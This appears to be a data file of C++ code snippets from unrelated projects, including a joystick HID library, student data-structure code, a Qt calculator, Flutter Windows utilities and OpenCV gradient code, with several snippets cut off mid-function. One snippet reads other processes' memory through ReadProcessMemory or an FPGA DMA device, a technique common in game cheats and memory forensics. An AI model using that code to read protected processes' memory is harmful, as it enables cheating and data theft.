damperSplineGain\n#include \"spline.h\"\n#endif\n#if defined(_USING_DYNAMIC_HID)\n\n#define JOYSTICK_REPORT_ID_INDEX 7\n#define JOYSTICK_AXIS_MINIMUM -32767\n#define JOYSTICK_AXIS_MAXIMUM 32767\n#define JOYSTICK_SIMULATOR_MINIMUM -32767\n#define JOYSTICK_SIMULATOR_MAXIMUM 32767\n\n#define JOYSTICK_INCLUDE_X_AXIS  B00000001\n#define JOYSTICK_INCLUDE_Y_AXIS  B00000010\n#define JOYSTICK_INCLUDE_Z_AXIS  B00000100\n#define JOYSTICK_INCLUDE_RX_AXIS B00001000\n#define JOYSTICK_INCLUDE_RY_AXIS B00010000\n#define JOYSTICK_INCLUDE_RZ_AXIS B00100000\n#define JOYSTICK_INCLUDE_SLIDER  B01000000\n#define JOYSTICK_INCLUDE_DIAL    B10000000\n\nconst float cutoff_freq_damper   = 2.0;  //Cutoff frequency in Hz\nconst float sampling_time_damper = 0.002; //Sampling time in seconds.\nLowPassFilter damperFilter[FFB_AXIS_COUNT];\nLowPassFilter inertiaFilter[FFB_AXIS_COUNT];\nLowPassFilter frictionFilter[FFB_AXIS_COUNT];\n\n#ifdef damperSplineGain\ndamperSplineGain;\n#endif\n\nvoid Joystick_::db(uint8_t a) {\n  tempHidReportDescriptor[hidReportDescriptorSize++] = a;\n}\n\ntemplate<typename... Args>\nvoid Joystick_::db(uint8_t a, Args... args) {\n  tempHidReportDescriptor[hidReportDescriptorSize++] = a;\n  db(args...);\n}\n\nJoystick_::Joystick_(\n\tuint8_t hidReportId,\n\tuint8_t joystickType,\n    uint8_t buttonCount,\n\tuint8_t hatSwitchCount,\n\tbool includeXAxis,\n\tbool includeYAxis,\n\tbool includeZAxis,\n\tbool includeRxAxis,\n\tbool includeRyAxis,\n\tbool includeRzAxis,\n\tbool includeSlider,\n\tbool includeDial)\n{\n    // Set the USB HID Report ID\n    _hidReportId = hidReportId;\n\n    // Save Joystick Settings\n    _buttonCount = buttonCount;\n\t_hatSwitchCount = hatSwitchCount;\n\t_includeAxisFlags = 0;\n\t_includeAxisFlags |= (includeXAxis ? JOYSTICK_INCLUDE_X_AXIS : 0);\n\t_includeAxisFlags |= (includeYAxis ? JOYSTICK_INCLUDE_Y_AXIS : 0);\n\t_includeAxisFlags |= (includeZAxis ? JOYSTICK_INCLUDE_Z_AXIS : 0);\n\t_includeAxisFlags |= (includeRxAxis ? JOYSTICK_INCLUDE_RX_AXIS : 0);\n\t_includeAxisFlags |= (includeRyAxis ? JOYSTICK_INCLUDE_RY_AXIS : 0);\n\t_includeAxisFlags |= (includeRzAxis ? JOYSTICK_INCLUDE_RZ_AXIS : 0);\n\t_includeAxisFlags |= (includeSlider ? JOYSTICK_INCLUDE_SLIDER : 0);\n\t_includeAxisFlags |= (includeDial ? JOYSTICK_INCLUDE_DIAL : 0);\n\n\t\n    // Build Joystick HID Report Description\n\t\n\t// Button Calculations\n\tuint8_t buttonsInLastByte = _buttonCount % 8;\n\tuint8_t buttonPaddingBits = 0;\n\tif (buttonsInLastByte > 0)\n\t{\n\t\tbuttonPaddingBits = 8 - buttonsInLastByte;\n\t}\n\t\n\t// Axis Calculations\n\tuint8_t axisCount = (includeXAxis == true)\n\t\t+  (includeYAxis == true)\n\t\t+  (includeZAxis == true)\n\t\t+  (includeRxAxis == true)\n\t\t+  (includeRyAxis == true)\n\t\t+  (includeRzAxis == true)\n\t\t+  (includeSlider == true)\n\t\t+  (includeDial == true);\n\t\t\n\thidReportDescriptorSize = 0;\n    tempHidReportDescriptor = new uint8_t[HID_DESCRIPTOR_MAXLENGTH];\n    \n    db(0x05, 0x01);                 // USAGE_PAGE (Generic Desktop)\n    db(0x09, joystickType);         // USAGE (Joystick - 0x04; Gamepad - 0x05; Multi-axis Controller - 0x08)\n    db(0xa1, 0x01);                 // COLLECTION (Application)\n    db(0x09, 0x01);                 //   USAGE (Pointer)\n    db(0x85, 0x01);                 //   REPORT_ID (Default: 1)\n\n\tif (_buttonCount > 0) {\n        db(0x05, 0x09);                 //   USAGE_PAGE (Button)\n        db(0x19, 0x01);                 //     USAGE_MINIMUM (Button 1)\n        db(0x29, _buttonCount);         //     USAGE_MAXIMUM (Button _buttonCount)            \n        db(0x15, 0x00);                 //     LOGICAL_MINIMUM (0)\n        db(0x25, 0x01);                 //     LOGICAL_MAXIMUM (1)\n        db(0x75, 0x01);                 //     REPORT_SIZE (1)\n        db(0x95, _buttonCount);         //     REPORT_COUNT (# of buttons)\n        db(0x55, 0x00);                 //     UNIT_EXPONENT (0)\n        db(0x65, 0x00);                 //     UNIT (None)\n        db(0x81, 0x02);                 //   INPUT (Data,Var,Abs)\n\n\n        // Padding Bits Needed\n\t\tif (buttonPaddingBits > 0) {\n            db(0x75, 0x01);               //   REPORT_SIZE (1)\n            db(0x95, buttonPaddingBits);  //   REPORT_COUNT (# of padding bits)\n            db(0x81,",
    "/*\n Program Name: Static_Stack.cpp\n Programmer: Moris Gomez\n Date: Tuesday 04/02/2024\n Version Control: 4.0\n About: Week 8, CSCI 2, Example 1.\n Description:\n    Intro to Static Stacks via arrays.\n*/#include <iostream>\n\nusing namespace std;\n\n//create IntStack:\nclass IntStack\n{\nprivate:\n    int *stackArray; //does stackArray point to the address of the first element?\n                    //would we need to derefrence each index to access value?\n    int size;\n    int top;\n\npublic:\n//CONSTRUCTOR:\n    IntStack(int sz)\n    {\n        //code for regular array: int name_array[sz];\n        stackArray = new int[sz]; //initializes stack array with a set size of 'sz'.\n        size = sz; //initializes the size of the stack array.\n        top = -1; //initializes the top of the stack array to -1.\n                  //-1 means empty stack array.\n    } //end constructor.\n    \n//COPY CONSTRUCTOR:\n    IntStack(const IntStack &obj) //& = reference, so changes to obj in func reflected in main.\n    {\n        //step 1: create stackArray.\n        if(obj.size > 0)\n        {\n            stackArray = new int[obj.size];\n        }\n        else\n        {\n            stackArray = NULL; //points to NULL bc no size of new obj.\n        }\n        //step 2: copy size variable.\n        size = obj.size;\n        //step 3: copy the stack contents.\n        for(int count = 0; count < size; count++)\n        {\n            stackArray[count] = obj.stackArray[count]; //obj3 = obj1.\n        } //end for loop.\n    } //end copy constructor.\n    \n    \n//MEMBER FUNCTION #1: isFull().\n    bool isFull() const //const = read-only func, so wont modify object it is called on.\n                        //sort of like a getter.\n    {\n        if(top == size - 1) //if top is size - 1, it if full\n                            //array size 5 needs to have top index as 4 to be full.\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n    } //end isFull() function.\n    \n//MEMBER FUNCTION #2: isEmpty().\n    bool isEmpty() const\n    {\n        if(top == -1) //if top is -1, list is empty: -1 is initialized during constructor.\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n    } //end isEmpty() function.\n    \n//MEMBER FUNCTION #3: push().\n    void push(int num)\n    {\n        if(isFull()) //if stack is full, cannot push bc arrays are fixed size.\n        {\n            cout << \"Stack is full.\" << endl;\n        }\n        else //not full.\n        {\n            top = top + 1; //top becomes new index.\n            stackArray[top] = num; //set that new index to num.\n        }\n    } //end push() function.\n    \n//MEMBER FUNCTION #4: pop().\n    void pop(int &num)\n    {\n        if(isEmpty()) //empty, so cannot remove any elements.\n        {\n            cout << \"Stack is empty.\" << endl;\n        }\n        else //has some indexes.\n        {\n            num = stackArray[top]; //assign top to num\n            top = top - 1;\n        }\n    } //end pop() function.\n    \n//MEMBER FUNCTION #5: peek().\n    int peek() const\n    {\n        if(isEmpty())\n        {\n            cout << \"Stack is empty.\" << endl;\n            return -1;\n        }\n        else\n        {\n            return stackArray[top];\n        }\n    } //end peek() function.\n\n//MEMBER FUNCTION #5: display().\n    void display()\n    {\n        int t = top; //last one in, first one out.\n        //using while loop to traverse through stack array.\n        while(t >= 0)\n        {\n            cout << stackArray[t] << endl;\n            t = t - 1;\n        } //end while loop.\n    } //end display() function.\n}; //end class IntStack.\n\n\n\n//DRIVER for IntStack class via main function:\nint main()\n{\n    //1)CREATE A STACK AND PUSH SOME VALUES:\n    IntStack stackOne(5); //creates a Static Stack w/ a fixed size of 5 elements using constructor.\n                //top = -1, size = 5.\n    stackOne.push(7); //first one in, last one out. = BOTTOM of stack.\n    stackOne.push(6);\n    stackOne.push(4);\n    stackOne.push(5);\n    stackOne.push(2); //last one in, first one out = TOP of stack.\n    stackOne.display();\n    //BOTTOM [7, 6, 4, 5, 2] TOP\n    //        0, 1, 2, 3, 4 =>indexes.\n    /*\n     TOP OF STACK:\n     value at index 4 = [2]\n     value at index 3 = [5]\n     value at index 2 = [4]\n     value at index 1 = [6]\n     value at index 0 = [7]\n     value at index -1 = [?] does index - 1 have a value?\n     BOTTOM OF STACK:\n     */\n    \n    //2)POP 1 VALUE FROM STACK:\n    int x;\n    stackOne.pop(x); //pops top index, must pass num as a variable.\n    //top index should now be 3 with value 5 bc index 4 w/ value 2 was popped off.\n    \n    //3) PEEK TO SEE TOP VALUE:\n    cout << \"the top value is now: \" << stackOne.peek() << endl; //peek returns the value at top index not indez itself. //should be 5\n    stackOne.display();\n    /*\n     value at index 3 = [5]\n     value at index 2 = [4]\n     value at index 1 = [6]\n     value at index 0 = [7]\n     */\n    \n    //4) USE ISFULL",
    "#include \"mainwindow.h\"\n#include \"./ui_mainwindow.h\"\n#include <QMessageBox>\n#include<iostream>\ndouble sum = 0;\nbool num_after_operation = false;\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent), ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n    connect(ui->pushButton_0, SIGNAL(clicked()), this, SLOT(digit_numbers()));\n    connect(ui->pushButton_2, SIGNAL(clicked()), this, SLOT(digit_numbers()));\n    connect(ui->pushButton_3, SIGNAL(clicked()), this, SLOT(digit_numbers()));\n    connect(ui->pushButton_4, SIGNAL(clicked()), this, SLOT(digit_numbers()));\n    connect(ui->pushButton_5, SIGNAL(clicked()), this, SLOT(digit_numbers()));\n    connect(ui->pushButton_6, SIGNAL(clicked()), this, SLOT(digit_numbers()));\n    connect(ui->pushButton_7, SIGNAL(clicked()), this, SLOT(digit_numbers()));\n    connect(ui->pushButton_8, SIGNAL(clicked()), this, SLOT(digit_numbers()));\n    connect(ui->pushButton_9, SIGNAL(clicked()), this, SLOT(digit_numbers()));\n    connect(ui->pushButton_sign, SIGNAL(clicked()), this, SLOT(operations()));\n    connect(ui->pushButton_percent, SIGNAL(clicked()), this, SLOT(operations()));\n    connect(ui->pushButton_mult, SIGNAL(clicked()), this, SLOT(math()));\n    connect(ui->pushButton_plus, SIGNAL(clicked()), this, SLOT(math()));\n    connect(ui->pushButton_minus, SIGNAL(clicked()), this, SLOT(math()));\n    connect(ui->pushButton_div, SIGNAL(clicked()), this, SLOT(math()));\n\n    ui->pushButton_div->setCheckable(true);\n    ui->pushButton_minus->setCheckable(true);\n    ui->pushButton_plus->setCheckable(true);\n    ui->pushButton_mult->setCheckable(true);\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n// void MainWindow::on_pushButton_9_clicked()\n// {\n//     ui->label1->setText(\"9\");\n//     //QMessageBox::critical(this, \"name\", \"text\");\n//     //QMessageBox::information(this, \"name\", \"text\");\n//     //QMessageBox::about(this, \"name\", \"text\");\n//     QMessageBox::StandardButton reply = QMessageBox::question(this, \"name\",\"text\", QMessageBox::Yes | QMessageBox::No);\n//     if (reply == QMessageBox::Yes){\n//         QApplication::quit();\n//     }\n// }\n\nvoid MainWindow::digit_numbers()\n{\n    QPushButton *button = (QPushButton *)sender();\n    double all_numbers;\n    QString new_label;\n    if (!num_after_operation)\n    {\n        std::cout << ui->pushButton_plus->isChecked() << ui->pushButton_mult->isChecked() << ui->pushButton_minus->isChecked() << ui->pushButton_div->isChecked();\n        if (ui->pushButton_plus->isChecked() || ui->pushButton_mult->isChecked() || ui->pushButton_minus->isChecked() || ui->pushButton_div->isChecked())\n        {\n            all_numbers = (button->text()).toDouble();\n            num_after_operation = true;\n        }\n        else\n            all_numbers = (ui->label1->text() + button->text()).toDouble();\n    }\n    else\n        all_numbers = (ui->label1->text() + button->text()).toDouble();\n\n    new_label = QString::number(all_numbers, 'g', 15);\n    ui->label1->setText(new_label);\n}\n\nvoid MainWindow::on_pushButton_dot_clicked()\n{\n    if (!(ui->label1->text().contains('.')))\n        ui->label1->setText(ui->label1->text() + \".\");\n}\n\n\nvoid MainWindow::math()\n{\n    QPushButton *button = (QPushButton *)sender();\n    button->setChecked(true);\n    double input_number;\n    input_number = (ui->label1->text()).toDouble();\n\n    // QString new_number;\n    // new_number = QString::number(0,'g', 15);\n    // ui->label1->setText(new_number);\n\n    bool check_click = false;\n    if (ui->pushButton_plus->isChecked() && !(button->text() == \"+\"))\n    {\n        sum += input_number;\n        ui->pushButton_plus->setChecked(false);\n\n        check_click = true;\n    }\n    else if (ui->pushButton_minus->isChecked() && !(button->text() == \"-\"))\n    {\n        sum -= input_number;\n        ui->pushButton_minus->setChecked(false);\n\n        check_click = true;\n    }\n    else if (ui->pushButton_div->isChecked() && !(button->text() == \"\u00f7\"))\n    {\n        sum /= input_number;\n        ui->pushButton_div->setChecked(false);\n\n        check_click = true;\n    }\n    else if (ui->pushButton_mult->isChecked() && !(button->text() == \"x\"))\n    {\n        sum *= input_number;\n        ui->pushButton_mult->setChecked(false);\n\n        check_click = true;\n    }\n    if (!check_click)\n    {\n        sum = input_number;\n    }\n    else\n    {\n        QString new_number;\n        new_number = QString::number(sum, 'g', 15);\n        ui->label1->setText(new_number);\n    }\n    num_after_operation = false;\n}\n\nvoid MainWindow::on_pushButton_equal_clicked()\n{\n    double input_number;\n    num_after_operation = false;\n    input_number = (ui->label1->text()).toDouble();\n    if (ui->pushButton_plus->isChecked())\n    {\n        sum += input_number;\n        ui->pushButton_plus->setChecked(false);\n    }\n    else if (ui->pushButton_minus->isChecked())\n    {\n        sum -= input_number;\n        ui->pushButton_minus->setChecked(false);\n    }\n    else if (ui->pushButton_div->isChecked())\n    {\n        sum /= input_number;\n        ui->pushBut",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"Person.h\"\n\nPerson::Person(){\n  name = \"\";\n  ifMentor = false;\n  formAnswers = nullptr;\n  ranking = nullptr;\n}\n\nPerson::Person(string name, bool ifMentor, LinkedList* formAnswers){\n  this -> name = name;\n  this -> ifMentor = ifMentor;\n  this -> formAnswers = formAnswers;\n  ranking = nullptr;\n}\n\nPerson::Person(string name, bool ifMentor, LinkedList* formAnswers, PriorityQueue* ranking){\n  this -> name = name;\n  this -> ifMentor = ifMentor;\n  this -> formAnswers = formAnswers;\n  this -> ranking = ranking;\n}\n\nstring Person::getName(){\n  return name;\n}\n\nvoid Person::setName(string name){\n  this -> name = name;\n}\n\nbool Person::getIfMentor(){\n  return ifMentor;\n}\n\nvoid Person::setIfMentor(bool change){\n  this -> ifMentor = change;\n}\n\nLinkedList* Person::getFormAnswers(){\n  return formAnswers;\n}\n\nvoid Person::setFormAnswers(LinkedList* formAnswers){\n  this -> formAnswers = formAnswers;\n}\n\nPriorityQueue* Person::getRanking(){\n  return ranking;\n}\n\nvoid Person::setRanking(PriorityQueue* ranking){\n  this -> ranking = ranking;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <opencv2/opencv.hpp>\n\n/**\n * @brief Default image data with values equal to 1 converted to 255.\n */\nunsigned char defaultImageData[12][12] = {\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0},\n    {0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0},\n    {0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0},\n    {0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0},\n    {0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0},\n    {0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0},\n    {0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0},\n    {0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}};\n\n/**\n * @brief Prints the matrix representation of the image.\n *\n * @param image The image matrix.\n * @param N Size of the image matrix.\n */\nvoid printImageMatrix(cv::Mat image, int N = 12)\n{\n  for (int i = 0; i < N; i++)\n  {\n    for (int j = 0; j < N; j++)\n    {\n      int pixel_value = static_cast<int>(image.at<uchar>(i, j));\n      std::cout << pixel_value << \" \";\n    }\n    std::cout << std::endl;\n  }\n}\n\n/**\n * @brief Generates a circular image with given size.\n *\n * @param N Size of the image.\n * @return Generated image matrix.\n */\ncv::Mat generateImage(int N)\n{\n  cv::Mat image(N, N, CV_8UC1, cv::Scalar(0));\n\n  int center_x = N / 2;\n  int center_y = N / 2;\n  int radius = N / 4;\n\n  for (int i = 0; i < N; i++)\n  {\n    for (int j = 0; j < N; j++)\n    {\n      int distance = (i - center_x) * (i - center_x) + (j - center_y) * (j - center_y);\n      if (distance <= radius * radius)\n      {\n        image.at<uchar>(i, j) = 255;\n      }\n    }\n  }\n\n  return image;\n}\n\nint main()\n{\n  const int N = 12;\n  // cv::Mat image = generateImage(N);\n  cv::Mat image(N, N, CV_8UC1, defaultImageData);\n\n  std::cout << \"image\" << std::endl;\n  printImageMatrix(image, N);\n  cv::imwrite(\"../images/image.png\", image);\n\n  int scale = 1;\n  int delta = 0;\n  cv::Mat grad;\n  cv::Mat grad_x, grad_y;\n  cv::Mat abs_grad_x, abs_grad_y;\n\n  cv::Sobel(image, grad_x, CV_16S, 1, 0, 3, scale, delta, cv::BORDER_DEFAULT);\n  cv::imwrite(\"../images/grad_x.png\", grad_x);\n  std::cout << \"grad_x\" << std::endl;\n  printImageMatrix(grad_x, N);\n\n  cv::Sobel(image, grad_y, CV_16S, 0, 1, 3, scale, delta, cv::BORDER_DEFAULT);\n  cv::imwrite(\"../images/grad_y.png\", grad_y);\n  std::cout << \"grad_y\" << std::endl;\n  printImageMatrix(grad_y, N);\n\n  cv::convertScaleAbs(grad_x, abs_grad_x);\n  cv::imwrite(\"../images/abs_grad_x.png\", abs_grad_x);\n  std::cout << \"abs_grad_x\" << std::endl;\n  printImageMatrix(abs_grad_x, N);\n\n  cv::convertScaleAbs(grad_y, abs_grad_y);\n  cv::imwrite(\"../images/abs_grad_y.png\", abs_grad_y);\n  std::cout << \"abs_grad_y\" << std::endl;\n  printImageMatrix(abs_grad_y, N);\n\n  cv::addWeighted(abs_grad_x, 0.5, abs_grad_y, 0.5, 0, grad);\n  cv::imwrite(\"../images/grad.png\", grad);\n  std::cout << \"grad\" << std::endl;\n  printImageMatrix(grad, N);\n\n  return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"Memory.h\"\n\n#ifdef USING_DMA\nVMM_HANDLE Memory::hVMM;\n#else\nHANDLE Memory::hProc;\n#endif\nDWORD Memory::pid;\nproc Memory::currentProc{};\nprocModule Memory::currentMod{};\nuintptr_t Memory::readLocation;\n\nbool Memory::Init()\n{\n#ifdef USING_DMA\n    LPSTR args[] = {(LPSTR) \"\", (LPSTR) \"-device\", (LPSTR) \"FPGA\"};\n    hVMM = VMMDLL_Initialize(3, args);\n    if (!hVMM)\n    {\n        std::cout << \"Failed to init VMM!\" << std::endl;\n        return false;\n    }\n#endif\n\n    return true;\n}\nvoid Memory::Exit()\n{\n#ifdef USING_DMA\n    VMMDLL_Close(hVMM);\n#endif\n}\n\nbool Memory::OpenProc(proc p)\n{\n#ifdef USING_DMA\n    if (!VMMDLL_PidGetFromName(hVMM, (LPSTR)p.name.c_str(), &pid))\n    {\n        std::cout << \"Failed to get pid!\" << std::endl;\n        return false;\n    }\n#else\n    HANDLE temp = OpenProcess(PROCESS_ALL_ACCESS, NULL, p.pid);\n    if (temp == INVALID_HANDLE_VALUE)\n    {\n        return false;\n    }\n    hProc = temp;\n#endif\n\n    currentProc = p;\n\n    return true;\n}\n\nstd::vector<procModule> Memory::GetMods()\n{\n    std::vector<procModule> mods;\n#ifdef USING_DMA\n    PVMMDLL_MAP_MODULE pModuleMap = NULL;\n    VMMDLL_Map_GetModuleU(hVMM, pid, &pModuleMap, 0);\n\n    for (int i = 0; i < pModuleMap->cMap; i++)\n    {\n        mods.push_back({ std::string(pModuleMap->pMap[i].uszText), pModuleMap->pMap[i].vaBase });\n    }\n    VMMDLL_MemFree(pModuleMap);\n    pModuleMap = NULL;\n#else\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, currentProc.pid);\n    if (hSnap == INVALID_HANDLE_VALUE) return mods;\n\n    MODULEENTRY32 entry{};\n    entry.dwSize = sizeof(MODULEENTRY32);\n\n    if (Module32First(hSnap, &entry))\n    {\n        do {\n            procModule m{};\n            m.address = (uintptr_t)entry.modBaseAddr;\n            m.size = entry.modBaseSize;\n\n            size_t i;\n            char temp[MAX_PATH];\n            wcstombs_s(&i, temp, entry.szModule, 256);\n\n            m.name = temp;\n\n            mods.push_back(m);\n        } while (Module32Next(hSnap, &entry));\n    }\n#endif\n\n        return mods;\n}\n\nstd::vector<proc> Memory::GetProcs()\n{\n    std::vector<proc> procs;\n#ifdef USING_DMA\n    PVMMDLL_PROCESS_INFORMATION pdata = 0;\n    DWORD pword = 0;\n\n    VMMDLL_ProcessGetInformationAll(hVMM, &pdata, &pword);\n\n    for (int i = 0; i < pword; i++)\n    {\n        procs.push_back({ std::string(pdata[i].szName), pdata[i].dwPID });\n    }\n\n    VMMDLL_MemFree(pdata);\n#else\n\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    PROCESSENTRY32 entry{};\n    entry.dwSize = sizeof(PROCESSENTRY32);\n\n    if (Process32First(hSnap, &entry))\n    {\n        do {\n            proc p{};\n            p.pid = entry.th32ProcessID;\n\n            size_t i;\n            char temp[MAX_PATH];\n            wcstombs_s(&i, temp, entry.szExeFile, MAX_PATH);\n\n\n            procs.push_back({ temp, p.pid });\n        } while (Process32Next(hSnap, &entry));\n    }\n#endif\n    return procs;\n}\n\n\nstd::vector<byte> Memory::ReadMemory(uintptr_t address, DWORD size)\n{\n    std::vector<byte> bytes;\n    bytes.resize(size);\n#ifdef USING_DMA\n    VMMDLL_MemReadEx(hVMM, pid, address, bytes.data(), size, 0, VMMDLL_FLAG_NOCACHE);\n#else\n    ReadProcessMemory(hProc, (LPCVOID)address, bytes.data(), size, nullptr);\n#endif\n\n    return bytes;\n}\n",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <limits> \n\nusing namespace std;\nconst int days = 7;\nconst int meals = 3;\nstring daysOfWeek[days] = {\"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\", \"Sunday\"};\nstruct Recipe\n{\n    vector<string> recipe;\n    int m = 0;\n};\n\nRecipe add_line_in_vector(const string &line)\n{\n    Recipe recipe;\n    stringstream get(line);\n    string temp;\n    while (getline(get, temp, ','))\n    {\n        if (temp != \"directions\")\n        {\n            recipe.m++; // Count the number of ingredients\n        }\n        else\n        {\n            // Stop parsing ingredients when \"directions\" is encountered\n        }\n        recipe.recipe.push_back(temp);\n    }\n    return recipe;\n}\n\nvoid searchRecipe(const string &file_name, const string &recipe_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        if (recipe_name == recipe.recipe[0])\n        {\n            flag = 1; // Recipe found\n            cout << \"Recipe Name: \" << recipe.recipe[0] << endl;\n            cout << \"Category: \" << recipe.recipe[1] << endl;\n            cout << \"Ingredients:\" << endl;\n            for (int i = 2; i < recipe.recipe.size(); ++i)\n            {\n                if (recipe.recipe[i] == \"directions\")\n                {\n                    cout << \"Directions :\" << endl;\n                }\n                else if (recipe.recipe[i] == \"Directions :\")\n                {\n                    continue;\n                }\n                else\n                    cout << \"-\"<<recipe.recipe[i] << endl;\n            }\n\n            break; // No need to continue searching after finding the recipe\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"Recipe not found.\" << endl;\n    }\n    file.close();\n}\nvoid 